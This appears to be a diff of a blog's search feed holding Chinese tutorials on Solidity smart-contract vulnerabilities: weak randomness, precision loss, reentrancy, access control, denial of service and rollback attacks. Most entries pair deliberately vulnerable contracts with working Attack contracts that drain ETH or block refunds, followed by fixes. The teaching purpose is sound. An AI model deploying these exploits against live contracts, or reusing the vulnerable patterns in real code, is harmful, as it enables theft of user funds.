-<p>当然这种方法也会有一些安全风险，例如依赖第三方给出的随机数种子的话同样会存在第三方作弊或者受贿的情形，即使是自己搭建的随机数服务也可能因为故障等原因无法使用，项目方也有可能操控随机数对 DApp 的运行和用户造成重大的损失。因此使用链下服务获取随机数的方法依赖于是否有一个可信又稳定的第三方服务，如果有，那么这个方法相较于使用区块链变量生成随机数的方法，随机数的不可预测性会更强一些。</p>
-<h3 id="漏洞示例"><a href="#漏洞示例" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>猜数字游戏，玩家通过调用合约 mint() 函数，函数会产生一个随机数，如果随机数为奇数，表示中奖，会给于 1 ether 作为奖励；如果随机数为偶数，表示没有中奖。以下是漏洞代码：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract Random &#123;</span><br><span class="line">    event Log(string);</span><br><span class="line">    constructor() payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function _getRandom() private view returns(bool) &#123;</span><br><span class="line">        uint256 random = uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp)));</span><br><span class="line">        if(random%2 == 0) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mint() public payable returns(bool randLucky) &#123;</span><br><span class="line">        randLucky = _getRandom();</span><br><span class="line">        if (randLucky == true) &#123;</span><br><span class="line">            require(payable(msg.sender).send(1 ether));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>以上代码实现使用了区块链变量来生成随机数的算法， 这里生成的随机数是可以被攻击预测到的，并可以清空受害合约的余额。<br>攻击合约使用死循环，不断判断受害合约的余额，直到取光所有的 ETH 。以下攻击代码：<br>如计算结果为偶数，需等待下一个区块；<br>如计算结果为奇数，保证获取奖励，并取走所有余额。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    event Log(string);</span><br><span class="line">    receive() external payable &#123; &#125;</span><br><span class="line"></span><br><span class="line">    function attack(address _random) external payable &#123;</span><br><span class="line">        for (;;) &#123;</span><br><span class="line">            if (_random.balance &lt; 1 ether) &#123;</span><br><span class="line">                emit Log(&quot;balance not enugh.&quot;);</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp))) % 2 == 0) &#123;</span><br><span class="line">                emit Log(&quot;failed to get rand number.&quot;);</span><br><span class="line">                return ;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            (bool ok, ) = _random.call(abi.encodeWithSignature(&quot;mint()&quot;));</span><br><span class="line">            if(!ok)&#123;</span><br><span class="line">                emit Log(&quot;failed to call mint().&quot;);</span><br><span class="line">                return ;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                emit Log(&quot;get reward success.&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p><strong>外部随机数生成器：</strong> 利用外部随机数生成服务，例如Chainlink VRF（Verifiable Random Function），提供真实随机数并且具备可验证的特性。<br><strong>多源输入：</strong> 将多个来源的数据组合生成随机数，例如区块链属性、用户输入，以及合约状态的混合使用，提升不可预测性。<br><strong>时间延迟：</strong> 不马上使用生成的随机数，而是等几个区块之后再使用，以增加干扰概率，降低操控的可能性。<br><strong>密码学方法：</strong> 使用密码学安全的随机数生成算法，确保攻击者无法逆推出初始状态或预测生成结果。</p>
 ]]></content>
       <tags>
         <tag>Solidity</tag>
@@ -560,6 +344,224 @@
 ]]></content>
       <tags>
         <tag>EVM安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>算术精度损失</title>
+    <url>/2024/01/21/%E7%AE%97%E6%9C%AF%E7%B2%BE%E5%BA%A6%E6%8D%9F%E5%A4%B1/</url>
+    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>由于 Solidity 不支持浮点运算，对于整数除法，小于除数的精度会被舍弃，从而导致精度损失。</p>
+<p>实际中，精度损失大致分为两种：</p>
+<ul>
+<li>四舍五入计算问题，在进行除法或减法运算时，计算顺序可能会导致精度损失；</li>
+<li>错误的向上或向下取整，可能导致本应为 0 的值取为 1 ，使得后续计算出现严重偏差。</li>
+</ul>
+<h3 id="漏洞示例"><a href="#漏洞示例" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>以下例子中，通过改变乘法和除法的计算顺序，导致计算结果不同。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract IntDivison &#123;</span><br><span class="line">    uint256 a = 100 ;</span><br><span class="line">    uint256 b = 15 ;</span><br><span class="line">    uint256 c = 30 ;</span><br><span class="line"></span><br><span class="line">    function test1() public view returns(uint256) &#123;</span><br><span class="line">        return a / b * c ;   // 计算结果为 180</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test2() public view returns(uint256) &#123;</span><br><span class="line">        return a * c / b ;   // 计算结果为 200</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>这里暂不考虑整数溢出的情况，溢出问题见整型溢出章节。</p>
+<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ul>
+<li>调整运算的操作顺序，例如整数乘法优先于除法进行计算；</li>
+<li>增加整数的数量级，例如以太坊中使用最小单位 wei（1 ETH &#x3D; 1e18 wei）处理数学计算，</li>
+<li>设置合适的舍入规则，对于向上&#x2F;向下取整的情况，应考虑多种复杂的场景；</li>
+<li>使用安全有效的高精度计算库；</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>Solidity</tag>
+        <tag>智能合约安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>重入攻击</title>
+    <url>/2023/08/19/%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/</url>
+    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>重入攻击（Reentrancy Attack）是一种常见的智能合约安全漏洞，当一个函数对另一个不受信任的合约进行外部调用时，就可能发生重入攻击。</p>
+<p>重入攻击的本质是合约内部调用的函数未能恰当地处理合约状态的更新，攻击者利用这个漏洞，将攻击代码插入到合约执行流程中，使得攻击者可以在合约还未完成之前再次调用某个函数(如: fallback, receive)，从而让攻击者在合约中获得额外的资产或信息。可以认为合约中所有的外部调用都是不安全的，都有可能存在重入漏洞。</p>
+<p>重入攻击类似编程里的递归调用，发生重入攻击的条件有2个：</p>
+<ul>
+<li>调用外部的合约且该合约是不安全的；</li>
+<li>外部合约的函数调用早于状态变量的更新；</li>
+</ul>
+<p>著名的重入攻击事件：<br>2016 年，The DAO 合约被重入攻击，黑客盗走了合约中的 3,600,000 枚 ETH，并导致以太坊分叉为 ETH 链和 ETC（以太经典）链。<br>2019 年，合成资产平台 Synthetix 遭受重入攻击，被盗 3,700,000 枚 sETH。<br>2020 年，借贷平台 Lendf.me 遭受重入攻击，被盗 $25,000,000。<br>2021 年，借贷平台 CREAM FINANCE 遭受重入攻击，被盗 $18,800,000。<br>2022 年，算法稳定币项目 Fei 遭受重入攻击，被盗 $80,000,000。</p>
+<h3 id="漏洞示例"><a href="#漏洞示例" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>先介绍几个概念</p>
+<p><strong>receive函数和fallback函数</strong></p>
+<p>Solidity支持两种特殊的回调函数，receive() 和 fallback() 。(在0.6版本之后 fallback() 函数拆分成 receive() 和 fallback() 两个函数)</p>
+<p>receive函数，不能有任何的参数，不能返回任何值，不需要function关键字，必须包含external和payable，一个合约最多只有一个receive()函数。</p>
+<ul>
+<li>原型：<code>receive() external payable &#123; ... &#125;</code>;</li>
+<li>功能：接收外部转账时需要实现此函数；</li>
+</ul>
+<p>fallback函数，不需要function关键字，必须由external修饰，payable修饰符是可选的，一个合约至多含有一个fallback()函数。</p>
+<ul>
+<li>原型：<code>fallback() external [payable] &#123; ... &#125;</code>;</li>
+<li>功能：调用合约不存在的函数时触发fallback函数执行；</li>
+</ul>
+<p><strong>转账函数</strong></p>
+<ol>
+<li><p>transfer</p>
+<ul>
+<li>函数原型：<code>&lt;address payable&gt;.transfer(uint256 amount)</code>;</li>
+<li>如果函数执行异常会转账失败，抛出异常（等价于require(send()）(合约地址转账)，会回滚交易（revert);</li>
+<li>有gas限制，最大2300（对方合约的fallback或receive函数不能实现太复杂的逻辑，否则gas不够）;</li>
+</ul>
+</li>
+<li><p>send</p>
+<ul>
+<li>函数原型：<code>&lt;address payable&gt;.send(uint256 amount) returns (bool)</code>;</li>
+<li>如果函数执行异常会转账失败，仅会返回false，不会终止执行（合约地址转账）;</li>
+<li>有gas限制，最大2300（对方合约的fallback或receive函数不能实现太复杂的逻辑，否则gas不够）;</li>
+</ul>
+</li>
+<li><p>call</p>
+<ul>
+<li>函数原型：<code>&lt;address&gt;.call(bytes memory) returns (bool, bytes memory)</code>；</li>
+<li>如果函数执行异常会转账失败，金辉返回false，不会终止执行（调用合约的方法并转账）；</li>
+<li>没有gas限制（支持对方合约的fallback、receive和其它函数实现复杂的逻辑）；</li>
+</ul>
+</li>
+</ol>
+<p><strong>代码示例</strong></p>
+<p>以下代码中 Bank 合约可以进行存款和取款，Attack 合约首先存入1个ETH，然后通过 Bank 合约的 withdraw 函数进行取款，Attack 合约收款时在 fallback() 或 receive() 函数中又重新调用了 Bank 合约的 withdraw() 函数，由于 Attack 的银行余额并没有及时更新，导致可以递归循环取走 Bank 合约中的所有ETH。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract Bank &#123;</span><br><span class="line">    mapping (address =&gt; uint256) public balanceOf;    // 余额mapping</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    // 存入ether，并更新余额</span><br><span class="line">    function deposit() external payable &#123;</span><br><span class="line">        balanceOf[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 提取msg.sender的全部ether</span><br><span class="line">    function withdraw() external &#123;</span><br><span class="line">        uint256 balance = balanceOf[msg.sender]; // 获取余额</span><br><span class="line">        require(balance &gt; 0, &quot;Insufficient balance&quot;);</span><br><span class="line">        // call进行转账，可能激活攻击合约的fallback/receive函数，存在重入风险</span><br><span class="line">        (bool success, ) = msg.sender.call&#123;value: balance&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Failed to send Ether&quot;);</span><br><span class="line">        // 更新余额</span><br><span class="line">        balanceOf[msg.sender] = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 获取银行合约的余额</span><br><span class="line">    function getBalance() external view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    Bank public bank; // Bank合约地址</span><br><span class="line"></span><br><span class="line">    // 初始化Bank合约地址</span><br><span class="line">    constructor(Bank _bank) &#123;</span><br><span class="line">        bank = _bank;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 回调函数，用于重入攻击Bank合约，反复的调用目标的withdraw函数</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        if (bank.getBalance() &gt;= 1 ether) &#123;</span><br><span class="line">            bank.withdraw();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 攻击函数，调用时 msg.value 设为 1 ether</span><br><span class="line">    function attack() external payable &#123;</span><br><span class="line">        require(msg.value == 1 ether, &quot;Require 1 Ether to attack&quot;);</span><br><span class="line">        bank.deposit&#123;value: 1 ether&#125;();</span><br><span class="line">        bank.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 获取本合约的余额</span><br><span class="line">    function getBalance() external view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p><strong>检查-效果-交互（checks-effect-interaction）</strong></p>
+<ul>
+<li>先检查状态是否满足条件。以Bank合约为例，即 <code>require(balance &gt; 0, &quot;Insufficient balance&quot;);</code></li>
+<li>再更新状态。以Bank合约为例，即 <code>balanceOf[msg.sender] = 0;</code></li>
+<li>最后再和其它合约进行交互。以Bank合约为例，即<code>(bool success, ) = msg.sender.call&#123;value: balance&#125;(&quot;&quot;);</code></li>
+</ul>
+<p><strong>重入锁</strong></p>
+<p>重入锁是一种防止重入函数的修饰器（modifier）。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint8 private _status;</span><br><span class="line">modifier nonReentrant() &#123;</span><br><span class="line">    require(_status == 0, &quot;Reentrant call&quot;);</span><br><span class="line">    _status = 1;</span><br><span class="line"></span><br><span class="line">    _;</span><br><span class="line">    </span><br><span class="line">    _status = 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
+      <tags>
+        <tag>Solidity</tag>
+        <tag>智能合约安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>访问控制漏洞</title>
+    <url>/2023/09/02/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>合约没有正确的实现权限控制机制，导致未经授权的用户可以访问敏感函数或数据。例如，合约中的敏感函数没有适当的访问控制修饰符，使任何人都可以调用。访问控制漏洞主要分两个方面：</p>
+<p><strong>1. 代码层可见性</strong></p>
+<p>针对函数和变量，限制其所能修改和调用的作用域。</p>
+<ul>
+<li>public: 函数或状态变量可以从合约内部和外部进行访问；</li>
+<li>external: 只能被其它合约调用，不能在当前合约内部直接调用，不能用于修饰变量，只能修饰函数。外部函数通常用于提供合约的接口，可以从其它合约或外部交易调用。</li>
+<li>internal: 函数或状态变量可以在当前合约内部以及继承合约中进行访问。也是默认的函数和状态变量修饰符（Solidity高版本中编译器会为没有明确设置可见性的函数和状态变量显示告警）。</li>
+<li>private:  函数或状态变量仅能在当前合约内部访问，私有函数和状态变量对于外部地址是不可见的，只能在合约内的其它函数中使用。</li>
+</ul>
+<p><strong>2. 逻辑层权限约束</strong></p>
+<p>通常针对函数，限制某些特权用户访问。</p>
+<ul>
+<li>modifier:  常用于在函数执行前检查某种前置条件，封装为函数修改器，提升代码的复用性，可传参可被继承，还可以多个修改器同时使用。</li>
+</ul>
+<h3 id="常见场景"><a href="#常见场景" class="headerlink" title="常见场景"></a>常见场景</h3><p><strong>不受限制的敏感函数：</strong> 合约中函数如果包含了敏感操作，并且对外公开，会导致任何人都可以调用。如初始化操作，取款，销毁等</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function burn(address account, uint256 amount) public &#123;  // 任何人都可以调用</span><br><span class="line">  _burn(account, amount); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>角色过度授权：</strong> 如果角色权限实现逻辑存在缺陷，就可能存在过度授权的风险。例如，合约为管理员角色授予了太多权限，使其能够执行合约的关键功能。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function criticalFunction() public onlyAdmin &#123;</span><br><span class="line">  // 关键功能</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h3><p>以下代码是修改合约所有者（owner），由于 changeOwner() 是 public 的，所以任何外部账户或合约都可以调用。因此，攻击者可以调用该函数改变合约的所有权并取得控制权。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract AuthTest &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function changeOwner(address _newOwner) public &#123; // 任何人都可以调用修改 owner</span><br><span class="line">        owner = _newOwner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ul>
+<li>合理使用可见性修饰符和 modifier 进行约束，遵循<strong>最小权限原则</strong>；</li>
+<li>设计合理的访问控制模型，且与代码实现逻辑一直；</li>
+<li>使用形式化验证检测访问控制漏洞。</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>Solidity</tag>
+        <tag>智能合约安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>拒绝服务攻击</title>
+    <url>/2023/09/09/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/</url>
+    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>拒绝服务（DOS）攻击是一种常见的网络攻击手段，其目的是通过向目标服务器发送大量请求或占用其资源，使其无法正常处理合法用户的请求。在智能合约中，攻击者可以通过发送恶意交易或利用智能合约中的漏洞使得智能合约系统无法正常运行，从而导致服务拒绝或系统瘫痪，因此智能合约的设计和实现应该考虑到DOS攻击的威胁并采取相应的安全措施来保障系统的稳定性和可靠性。</p>
+<p>拒绝服务主要包含以下四大类：</p>
+<p><strong>非预期的外部调用</strong></p>
+<p>当合约对外部调用处理不当时可能导致拒绝服务。例如合约中存在基于外部函数执行的结果来改变合约状态且没有对交易一直失败的情况做出处理，攻击者会利用这个特点故意使交易失败，合约则会一直重复这笔失败的交易从而造成合约逻辑卡在这里不能继续执行，最后使得智能合约暂时或永久不可用。</p>
+<p><strong>Gas达到区块上限</strong></p>
+<p>当交易的gas开销达到区块上限时交易会失败，导致拒绝服务。例如合约中的映射或数组长度没有限制，导致循环遍历时消耗大量的 gas ，当 gas limit 高于可用的 max limit时，导致交易失败。</p>
+<p><strong>逻辑设计缺陷</strong></p>
+<p>当合约自身的逻辑实现存在缺陷时，攻击者可利用该缺陷导致合约不可用。例如当合约的某个功能没有考虑全面，而实际使用存在多种极端情况，合约中某个功能无法正常处理特殊的交易或陷入瘫痪，最后导致拒绝服务。</p>
+<p><strong>运营管理不当</strong></p>
+<p>当合约后期运营管理不当可能导致拒绝服务。例如 Owner 或 管理员权限过大，敏感操作失误或私钥丢失等可能会导致拒绝服务攻击，如 selfdestruct 函数被非预期执行。</p>
+<h3 id="漏洞示例"><a href="#漏洞示例" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>下面代码中是个DoS漏洞的游戏，玩家们先存钱，游戏结束后，调用 deposit 退钱。<br>由于在调用 refund 取款的时候由于 Attack 合约中有 fallback、receive 中执行了 revert 回退，导致 DosGame.refund 的 call 检查转账结果返回 false 而导致合约无法正常提款。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract DosGame &#123;</span><br><span class="line">    bool public refundFinished;</span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line">    address[] public players;</span><br><span class="line"></span><br><span class="line">    // 所有玩家存ETH到合约里</span><br><span class="line">    function deposit() external payable &#123;</span><br><span class="line">        require(!refundFinished, &quot;Game Over&quot;);</span><br><span class="line">        require(msg.value &gt; 0, &quot;Please donate ETH&quot;);</span><br><span class="line">        // 记录存款</span><br><span class="line">        balanceOf[msg.sender] = msg.value;</span><br><span class="line">        // 记录玩家地址</span><br><span class="line">        players.push(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 游戏结束，退款开始，所有玩家将依次收到退款</span><br><span class="line">    function refund() external &#123;</span><br><span class="line">        require(!refundFinished, &quot;Game Over&quot;);</span><br><span class="line">        uint256 pLength = players.length;</span><br><span class="line">        // 通过循环给所有玩家退款</span><br><span class="line">        for(uint256 i; i &lt; pLength; i++)&#123;</span><br><span class="line">            address player = players[i];</span><br><span class="line">            uint256 refundETH = balanceOf[player];</span><br><span class="line">            (bool success, ) = player.call&#123;value: refundETH&#125;(&quot;&quot;);</span><br><span class="line">            require(success, &quot;Refund Fail!&quot;);</span><br><span class="line">            balanceOf[player] = 0;</span><br><span class="line">        &#125;</span><br><span class="line">        refundFinished = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balance() external view returns(uint256)&#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    // 退款时进行DoS攻击</span><br><span class="line">    fallback() external payable&#123;</span><br><span class="line">        revert(&quot;DoS Attack!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        revert(&quot;DoS Attack!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 参与DoS游戏并存款</span><br><span class="line">    function attack(address gameAddr) external payable &#123;</span><br><span class="line">        DosGame dos = DosGame(gameAddr);</span><br><span class="line">        dos.deposit&#123;value: msg.value&#125;();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ul>
+<li>在进行外部调用时返回结果是否符合预期，不应完全依赖外部调用结果；</li>
+<li>在使用循环或外部调用或复杂操作时，应考虑 Gas 消耗；</li>
+<li>合约逻辑设计应充分考虑所有可能的情况，并进行适当的处理；</li>
+<li>避免对单个角色过度授权，处理合约权限是应做到合理的权限划分，对拥有权限的角色使用多签钱包管理，防止由于私钥泄露导致权限丢失。</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>Solidity</tag>
+        <tag>智能合约安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>回退攻击</title>
+    <url>/2023/09/30/%E5%9B%9E%E9%80%80%E6%94%BB%E5%87%BB/</url>
+    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>回退攻击是根据执行结果来决定的，如果操作结果没有达到攻击者预期的效果，攻击者会让交易回退。使用 require(), revert() 和 assert() 可以使不满足条件的调用失败，从而回退交易。</p>
+<p><strong>require(), revert() 和 assert()</strong><br>是Solidity 0.4.10及之后的版本中错误处理机制，下面3个语句等价：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(condition) &#123; revert(); &#125;</span><br><span class="line"></span><br><span class="line">assert(condition);</span><br><span class="line"></span><br><span class="line">require(condition);</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>1. require</strong></p>
+<ul>
+<li>通常用于执行前输入验证和状态检查，一般用于函数的开头处；</li>
+<li>退还剩余的 Gas；</li>
+</ul>
+<p><strong>2. revert</strong></p>
+<ul>
+<li>通常用于直接触发回退，可自定义异常处理，适用于更复杂逻辑的处理场景；</li>
+<li>退还剩余的 Gas；</li>
+</ul>
+<p><strong>3. aasert</strong></p>
+<ul>
+<li>通常用于预防不应该发生的情况，失败的断言可能意味着代码层存在错误；</li>
+<li>消耗所有剩余的 Gas，并回退所有的操作；</li>
+</ul>
+<p><strong>利用条件</strong></p>
+<ul>
+<li>随机性。合约中的执行结果具有随机性，想要达到预期的执行结果需要进行多次尝试，如果每次执行结果是一样的就没有必要进行回退。</li>
+<li>允许合约调用。攻击者可以在合约中定义攻击逻辑，如果执行结果非期望的结果则进行回退，直到得到期望的结果。如果是 EOA 账户，在交易执行中无法对结果进行判断，只能在交易完成后才能访问结果，此时交易已经完成，区块链状态已经更新则不能进行回退。</li>
+<li>有利可图。合约运行结果中，存在某个结果是有利可图的。</li>
+</ul>
+<h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h3><p>以下代码是一个猜数字游戏，猜中数字即可获取 1 个ETH，猜错需要付出 0.1 个ETH，利用回退攻击，只要猜错就执行回退，因此可以通过消耗 gas 费来赢得奖励。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract GuessNum &#123;</span><br><span class="line">    constructor() payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function _getRandom() internal view returns(uint256 random) &#123;</span><br><span class="line">        // 此处方便漏洞案例演示，采用伪随机数,请忽略随机数漏洞</span><br><span class="line">        random = uint256(keccak256(abi.encodePacked(block.coinbase, block.difficulty, block.timestamp))) % 10;  </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint256 num) public  payable  &#123;</span><br><span class="line">        uint256 rand = _getRandom();</span><br><span class="line">        if ( rand == num) &#123;</span><br><span class="line">            payable(msg.sender).transfer(1 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getBalance() external view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    constructor() payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function rollBack(address gameAddr, uint256 num) external payable &#123;</span><br><span class="line">        uint256 beforeBalance = address(this).balance;</span><br><span class="line">        (bool success, ) = address(gameAddr).call&#123;value: 0.1 ether&#125;(abi.encodeWithSignature(&quot;guess(uint256)&quot;, num));</span><br><span class="line">        require(success, &quot;Failed to call.&quot;);</span><br><span class="line">        uint256 afterBalance = address(this).balance;</span><br><span class="line">        if (afterBalance &lt; beforeBalance) &#123;  // 通过余额来判断是否猜对，来决定是否进行回退。</span><br><span class="line">            revert(&quot;Failed to guessNum.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function getBalance() external view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>只允许 EOA 账户进行调用 或 限制特定合约地址调用。</p>
+]]></content>
+      <tags>
+        <tag>Solidity</tag>
+        <tag>智能合约安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>随机数攻击</title>
+    <url>/2023/06/24/%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%94%BB%E5%87%BB/</url>
+    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>随机数攻击，就是针对智能合约的随机数生成算法进行攻击，预测智能合约的随机数。</p>
+<p>常见的随机数获取有两种方式：使用区块变量生成随机数，使用预言机生成随机数。</p>
+<p><strong>区块链变量生成随机数</strong></p>
+<p>常见的区块链变量如下：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">block.basefee(uint)： 当前区块的基本费用</span><br><span class="line">block.chainid(uint)： 当前链id</span><br><span class="line">block.coinbase(address payable)： 当前区块矿工地址</span><br><span class="line">block.difficulty(uint)： 当前区块难度</span><br><span class="line">block.gaslimit(uint)： 当前区块gaslimit</span><br><span class="line">block.number(uint)： 当前区块号</span><br><span class="line">block.timestamp(uint)： 自Unix纪元以来的当前区块时间戳（以秒为单位）</span><br><span class="line">blockhash(uint blockNumber) returns (bytes32)： 给定区块的哈希，仅适用于256个最近的区块</span><br></pre></td></tr></table></figure></div>
+<p>由区块数据生成的随机数可能会限制普通用户预测随机数的可能性，但是并不能限制矿工作恶，矿工可以决定一个区块是否被广播，他们挖出了一个区块不是一定要广播出去也可以直接扔掉，这个就叫矿工的选择性打包。他们可以持续尝试生成随机数，直至得到想要的结果再广播出去。当然，旷工会这样做的前提是有足够的利益诱惑，例如可以获得一个很大的奖励池中的奖励，因此使用区块变量获取随机数的方法更适用于一些随机数不属于核心业务的应用。</p>
+<p><strong>预言机生成随机数</strong></p>
